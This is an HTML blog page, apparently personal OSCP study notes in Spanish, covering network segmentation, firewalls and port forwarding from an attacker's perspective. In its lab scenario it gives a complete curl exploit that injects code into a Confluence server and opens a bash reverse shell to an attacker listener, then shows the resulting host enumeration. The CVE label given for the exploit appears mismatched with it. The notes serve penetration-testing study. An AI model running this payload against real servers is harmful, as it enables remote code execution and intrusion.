@@ -1,0 +1,2333 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  
+
+  
+
+  <title>Port Forwarding</title>
+
+  
+  <meta name="author" content="Qv1nTv5">
+  
+
+  <meta name="description" content="Port Forwarding Basics.">
+
+  
+
+  
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+      
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    
+      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
+    
+  
+
+  
+
+  
+  
+  
+
+  
+
+  
+  <meta property="og:site_name" content="Home">
+  <meta property="og:title" content="Port Forwarding">
+  <meta property="og:description" content="Port Forwarding Basics.">
+
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:author" content="Qv1nTv5">
+  <meta property="og:article:published_time" content="2023-11-11T00:00:00-05:00">
+  <meta property="og:url" content="http://localhost:4000/2023-11-11-11.Port_Forwarding/">
+  <link rel="canonical" href="http://localhost:4000/2023-11-11-11.Port_Forwarding/">
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:site" content="@Qvintvs1">
+  <meta name="twitter:creator" content="@Qvintvs1">
+
+  <meta property="twitter:title" content="Port Forwarding">
+  <meta property="twitter:description" content="Port Forwarding Basics.">
+
+  
+
+  
+
+
+  
+
+  
+
+</head>
+
+
+<body>
+
+  
+
+
+  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="main-navbar">
+    <ul class="navbar-nav ml-auto">
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Program</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/Cpage">C</a>
+                  <a class="dropdown-item" href="/DHARMApage">Dharma</a>
+            </div>
+          </li>
+        
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Pentest</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/BURPSUITEpage">Burp</a>
+                  <a class="dropdown-item" href="/THMpage">Thm</a>
+                  <a class="dropdown-item" href="/HackTheBoxpage">Htb</a>
+                  <a class="dropdown-item" href="/PEN200page">BasicPentesting</a>
+                  <a class="dropdown-item" href="/REDTEAMBASICSpage">RedTeam</a>
+                  <a class="dropdown-item" href="/BLUETEAMBASICSpage">Blueteam</a>
+                  <a class="dropdown-item" href="/REDESpage">Net</a>
+                  <a class="dropdown-item" href="/2022-11-17-GitBasics">Git</a>
+            </div>
+          </li>
+        
+        <li class="nav-item">
+          <a class="nav-link" id="nav-search-link" href="#" title="Search">
+            <span id="nav-search-icon" class="fa fa-search"></span>
+            <span id="nav-search-text">Search</span>
+          </a>
+        </li></ul>
+  </div>
+
+  
+
+  
+
+</nav>
+
+
+
+<div id="beautifuljekyll-search-overlay">
+
+  <div id="nav-search-exit" title="Exit search">✕</div>
+  <input type="text" id="nav-search-input" placeholder="Search">
+  <ul id="search-results-container"></ul>
+  
+  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
+  <script>
+    var searchjson = '[ \
+       \
+        { \
+          "title"    : "2. Constants and Literals in C.", \
+          "category" : "C", \
+          "url"      : "/2024-12-10-1.ConstantsinC-copy/", \
+          "date"     : "December 10, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "1. Basics of C", \
+          "category" : "C", \
+          "url"      : "/2024-12-02-1.BasicsOfC/", \
+          "date"     : "December  2, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "DHA", \
+          "url"      : "/2024-09-24-Dharma_Tutorial/", \
+          "date"     : "September 24, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "fuzz", \
+          "url"      : "/2024-03-22-Dharma_Tutorial-copy/", \
+          "date"     : "March 22, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Mi experiencia con el OSCP", \
+          "category" : "pen", \
+          "url"      : "/2023-11-19-PEN200_Experience/", \
+          "date"     : "November 19, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Client Side", \
+          "category" : "pen", \
+          "url"      : "/2023-11-17-17.Client_Side_Attacks/", \
+          "date"     : "November 17, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Deep Packet Tunneling", \
+          "category" : "pen", \
+          "url"      : "/2023-11-16-16.Tunneling_Through_Deep_Packet_Inspection/", \
+          "date"     : "November 16, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Report", \
+          "category" : "pen", \
+          "url"      : "/2023-11-15-15.Making_Reports/", \
+          "date"     : "November 15, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "pen", \
+          "url"      : "/2023-11-14-14.Metasploit/", \
+          "date"     : "November 14, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Password Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-13-13.Password_Attacks/", \
+          "date"     : "November 13, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Active Directory Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-12-12.Active_Directory_Attacks/", \
+          "date"     : "November 12, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Port Forwarding", \
+          "category" : "pen", \
+          "url"      : "/2023-11-11-11.Port_Forwarding/", \
+          "date"     : "November 11, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Privilege Escalation", \
+          "category" : "pen", \
+          "url"      : "/2023-11-10-10.Privilege_Escalation/", \
+          "date"     : "November 10, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "File Transfers", \
+          "category" : "pen", \
+          "url"      : "/2023-11-09-9.File_Tranfers/", \
+          "date"     : "November  9, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Buffer Overflows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-08-8.Buffer_Overflows/", \
+          "date"     : "November  8, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Vulnerability Scanning.", \
+          "category" : "pen", \
+          "url"      : "/2023-11-07-7.Vulnerability_Scanning/", \
+          "date"     : "November  7, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Information Gathering", \
+          "category" : "pen", \
+          "url"      : "/2023-11-06-6.Active_Information_Gathering/", \
+          "date"     : "November  6, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Windows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-05-5.Windows/", \
+          "date"     : "November  5, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Networking", \
+          "category" : "pen", \
+          "url"      : "/2023-11-04-4.Networking/", \
+          "date"     : "November  4, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Scripting", \
+          "category" : "pen", \
+          "url"      : "/2023-11-03-3.Scripting/", \
+          "date"     : "November  3, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Practical Tools", \
+          "category" : "pen", \
+          "url"      : "/2023-11-02-2.PracticalTools/", \
+          "date"     : "November  2, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Linux", \
+          "category" : "pen", \
+          "url"      : "/2023-11-01-1.Linux/", \
+          "date"     : "November  1, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Easy", \
+          "category" : "hack", \
+          "url"      : "/2022-12-01-Easy/", \
+          "date"     : "December  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Git Basics", \
+          "category" : "", \
+          "url"      : "/2022-11-17-GitBasics/", \
+          "date"     : "November 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier I", \
+          "category" : "hack", \
+          "url"      : "/2022-11-10-Tier_1/", \
+          "date"     : "November 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier 0", \
+          "category" : "hack", \
+          "url"      : "/2022-11-09-Tier_0/", \
+          "date"     : "November  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7.BufferOverflow.", \
+          "category" : "thm", \
+          "url"      : "/2022-11-02-7.BufferOverflow/", \
+          "date"     : "November  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6.Offensive Pentesting", \
+          "category" : "thm", \
+          "url"      : "/2022-11-01-6.OffensivePentesting/", \
+          "date"     : "November  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5.RedTeam", \
+          "category" : "thm", \
+          "url"      : "/2022-10-30-5.RedTeam/", \
+          "date"     : "October 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4.Windows", \
+          "category" : "thm", \
+          "url"      : "/2022-10-22-4.Windows/", \
+          "date"     : "October 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3.Junior Penetrationtester path", \
+          "category" : "thm", \
+          "url"      : "/2022-09-02-3.JRPenetrationTester/", \
+          "date"     : "September  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2.Complete Begginer path.", \
+          "category" : "thm", \
+          "url"      : "/2022-08-07-2.CompleteBegginer/", \
+          "date"     : "August  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1.Pre-Security path.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-11-1Pre-Security/", \
+          "date"     : "July 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "0.Scripting for pentesters.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-10-0.Scripting_for_pentesters/", \
+          "date"     : "July 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Burp Certified Practitioner Practice Exam.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-30-PracticeExam/", \
+          "date"     : "March 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "22. OAuth Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-27-22.OAuth_authentication/", \
+          "date"     : "March 27, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "21. HTTP Request Smuggling.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-26-21.HTTP_request_smuggling/", \
+          "date"     : "March 26, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "20. HTTP Host Header Attacks.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-25-20.HTTP_Host_header_attacks/", \
+          "date"     : "March 25, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "19. Web Cache Poisoning.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-24-19.Web_cache_poisoning/", \
+          "date"     : "March 24, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "18. Server-Side Template Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-23-18.Serve-side_template_injection/", \
+          "date"     : "March 23, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "17. Insecure Deserialization.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-22-17.Insecure_deserialization/", \
+          "date"     : "March 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "16. WebSockets.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-21-16.WebSockets/", \
+          "date"     : "March 21, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "15.DOM-based XSS vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-20-15-DOM-based_vulnerabilities/", \
+          "date"     : "March 20, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "14. Clickjacking.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-19-14.Clickjacking/", \
+          "date"     : "March 19, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "13. Cross-Origin Resource Sharing.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-18-13.Cross-origin_resource_sharing_(CORS)/", \
+          "date"     : "March 18, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "12. Cross-Site Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-17-12.Cross-site_request_forgery_(CSRF)/", \
+          "date"     : "March 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "11. Cross-Site Scripting.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-16-11.Cross-site_scripting_(XSS)/", \
+          "date"     : "March 16, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "10. XXE Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-15-10.XXE_injection/", \
+          "date"     : "March 15, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "9. Server-Side Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-14-9.Server-side_request_forgery/", \
+          "date"     : "March 14, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "8. File Upload.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-13-8.File_upload_vulnerabilities/", \
+          "date"     : "March 13, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7. Access Control.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-12-7.Access_control/", \
+          "date"     : "March 12, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6. Information Disclosure.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-11-6.Information_disclosure/", \
+          "date"     : "March 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5. Bussiness Logic Vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-10-5.Business_logic_vulnerabilities/", \
+          "date"     : "March 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4. Command Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-09-4.Command_Injection/", \
+          "date"     : "March  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3. Directory Traversal.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-08-3.Directory_Traversal/", \
+          "date"     : "March  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2. Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-07-2.Authentication/", \
+          "date"     : "March  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1. SQLInjection", \
+          "category" : "burp", \
+          "url"      : "/2022-03-06-1.SQLInjection/", \
+          "date"     : "March  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Seguridad Perimetral", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Seguridad_Perimetral/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Hardening de sistemas", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Hardening_de_sistemas/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Bandit", \
+          "category" : "otw", \
+          "url"      : "/2022-02-08-Bandit/", \
+          "date"     : "February  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Proxy", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Proxys/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Protocolos Relevantes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Protocolos_Importantes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Curso Básico Redes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Precurso_Redes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "IPs", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-IPs/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Movimientos Laterales", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-06-Introducci%C3%B3n_a_movimientos_laterales/", \
+          "date"     : "February  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Evasión de Defensas", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Evasi%C3%B3n_de_Defensas/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Escalada de privilegios", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Escalada_de_privilegios/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-04-Metasploit_B%C3%A1sico/", \
+          "date"     : "February  4, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a aplicaciones Android", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-03-Ataques_aplicaciones_android/", \
+          "date"     : "February  3, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataque a aplicaciones web.", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-02-Ataques_a_aplicaciones_web/", \
+          "date"     : "February  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a Infraestructuras y Redes", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-01-Ataques_a_Infraestructuras_y_Redes/", \
+          "date"     : "February  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Análisis de Objetivos", \
+          "category" : "redteam", \
+          "url"      : "/2022-01-28-An%C3%A1lisis_de_Objetivos/", \
+          "date"     : "January 28, 2022" \
+        }, \
+       \
+       \
+        { \
+          "title"    : "Blueteam Basics", \
+          "category" : "page", \
+          "url"      : "/BLUETEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PortSwigger BurpSuite Course", \
+          "category" : "page", \
+          "url"      : "/BURPSUITEpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "C programming subjects.", \
+          "category" : "page", \
+          "url"      : "/Cpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Dharma Fuzzer language", \
+          "category" : "page", \
+          "url"      : "/DHARMApage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Exploiting &amp; Reversing", \
+          "category" : "page", \
+          "url"      : "/EXPREVpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Fuzzing JavaScript Engine", \
+          "category" : "page", \
+          "url"      : "/Fuzzpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "HackTheBox", \
+          "category" : "page", \
+          "url"      : "/HackTheBoxpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PEN200 notes", \
+          "category" : "page", \
+          "url"      : "/PEN200page/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Proyectos", \
+          "category" : "page", \
+          "url"      : "/PROJECTSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Networking Basics", \
+          "category" : "page", \
+          "url"      : "/REDESpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "RedTeam Basics", \
+          "category" : "page", \
+          "url"      : "/REDTEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Retired Machines", \
+          "category" : "page", \
+          "url"      : "/RetiredMachinespage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "TryHackMe", \
+          "category" : "page", \
+          "url"      : "/THMpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "About me", \
+          "category" : "page", \
+          "url"      : "/aboutme/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "THM", \
+          "category" : "page", \
+          "url"      : "/preOSCPpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Tag Index", \
+          "category" : "page", \
+          "url"      : "/tags/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page2/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page3/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page4/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page5/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page6/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page7/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page8/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page9/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page10/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page11/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page12/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page13/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page14/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page15/", \
+          "date"     : "January 1, 1970" \
+        } \
+       \
+    ]';
+    searchjson = JSON.parse(searchjson);
+
+    var sjs = SimpleJekyllSearch({
+      searchInput: document.getElementById('nav-search-input'),
+      resultsContainer: document.getElementById('search-results-container'),
+      json: searchjson
+    });
+  </script>
+</div>
+
+
+
+
+
+  <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>Port Forwarding</h1>
+          
+            
+              <h2 class="post-subheading">Port Forwarding Basics.</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on November 11, 2023</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class=" container-md ">
+  <div class="row">
+    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">
+
+      
+
+      
+
+      <article role="main" class="blog-post">
+        <h3 id="1-port-redirection-and-tunneling">1. Port Redirection and Tunneling.</h3>
+
+<p><strong>Segmented Networks. Firewalls.</strong></p>
+
+<p>Una Network o Red es un conjunto de ordenadores conectados entre sí, es decir, que pueden comunicarse entre ellos. Atendiendo a la topología podemos diferenciar dos tipos de redes:</p>
+
+<ul>
+  <li><em>Flat Networks</em>: Cuando todos las máquinas de una red se pueden comunicar entre sí directamente. Cada una de ellas tiene comunicación directa con cualquier otra.</li>
+  <li><em>Segmented Networks</em>: Cuando la red está divida en subredes que tienen un propósito concreto con un Gateaway que hace el rol de intermediario entre el interior de la subnet y el resto de la red.</li>
+</ul>
+
+<p>Por motivos obvios, las redes planas no son seguras, restringir (y por tanto regular a través de tecnologías como IDS, IPS, firewalls, etc) las comunicaciones entre las máquinas limita la superficie de ataque.</p>
+
+<p>Una de las tecnologías más comunes utilizadas para esto son los Firewalls. Los firewall se pueden implementar a nivel de software end-point. Por ejemplo, el kernel de Linux tiene capacidades de firewall que se pueden configurar con el conjunto de herramientas iptables, mientras que Windows ofrece el Firewall de Windows Defender incorporado. Aunque también se pueden implementar como características dentro de una parte de la infraestructura de red física. Los administradores pueden incluso colocar un firewall de hardware
+independiente en la red, filtrando todo el tráfico.</p>
+
+<p>Los firewalls pueden descartar paquetes entrantes no deseados y evitar que el tráfico potencialmente malicioso atraviese o abandone la red. Los firewalls pueden impedir que todos los hosts permitidos, excepto unos pocos, se comuniquen con un puerto en un servidor particularmente privilegiado. También pueden bloquear el acceso de algunos hosts o subredes a Internet en general .</p>
+
+<p>La mayoría de los firewalls tienden a permitir o bloquear el tráfico de acuerdo con un conjunto de reglas basadas en direcciones IP y números de puerto, por lo que su funcionalidad es limitada. Sin embargo, a veces se requiere un control más detallado. <em>Deep Packet Inspectio</em> monitorea el contenido del tráfico entrante y saliente y lo finaliza según un conjunto de reglas.</p>
+
+<p>Los límites establecidos por los administradores de red están diseñados para <strong>evitar el movimiento arbitrario de datos dentro, fuera y a través de la red</strong>. Pero, como atacante, estos son exactamente los límites que debemos atravesar. Tendremos que desarrollar estrategias que puedan ayudarnos a sortear las restricciones de red a medida que las encontremos.</p>
+
+<p><br /></p>
+
+<p><strong>Port Forwarding &amp; Tunneling</strong></p>
+
+<p>Así, para sortear estas medidas de seguridad aparecen los conceptos de <em>Port Forwarding</em> y <em>Tunneling</em>.</p>
+
+<p>La redirección de puertos (un término que usamos para describir varios tipos de reenvío de puertos) y la tunelización son estrategias que podemos usar para atravesar estos límites. La redirección de puertos significa modificar el flujo de datos para que los paquetes enviados a un socket se tomen y pasen a otro socket. La tunelización significa encapsular un tipo de flujo de datos dentro de otro, por ejemplo, transportar el tráfico HTTP dentro de una conexión SSH (por lo que desde una perspectiva externa, solo el tráfico SSH será visible).</p>
+
+<p><br /></p>
+
+<h3 id="2-port-forwading-with-linux-tools">2. Port Forwading with Linux Tools.</h3>
+
+<p>El Port Forwarding es la técnica más fundamental que examinaremos en este Módulo. También es una técnica que se usa muy comúnmente en redes de propósito general. Al reenviar información sobre puertos, configuramos un host para escuchar en un puerto y retransmitir todos los paquetes recibidos en ese puerto a otro puerto sobre otro destino.</p>
+
+<p>En condiciones normales de red, un administrador de red puede crear un reenvío de puerto para permitir el acceso a un servidor web detrás de un firewall. En ese caso, configurarían el firewall para escuchar en un puerto determinado en una interfaz y redirigir todos los paquetes al servidor web detrás de él.</p>
+
+<p>Muchos <em>routers</em> domésticos también brindan la funcionalidad de reenvío de puertos. Estos pueden configurarse para escuchar en un puerto en el lado del enrutador orientado a Internet y luego reenviar las conexiones desde ese puerto a otro dispositivo dentro de la red doméstica.</p>
+
+<p><br /></p>
+
+<h4 id="21-simple-port-forwarding-scenario">2.1. Simple Port Forwarding Scenario.</h4>
+
+<p><strong>Enumeración del entorno.</strong></p>
+
+<p>Supongámos que hemos ganado acceso RCE a un servidor mediante el siguiente exploit:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -v http://192.168.214.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.204/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+</code></pre></div></div>
+
+<p>Asociado al CVE-2022-23134. Y comprobamos sus interfaces de red. Encontramos que posee dos interfaces de red.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
+ip addr
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
+       valid_lft forever preferred_lft forever
+    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
+       valid_lft forever preferred_lft forever
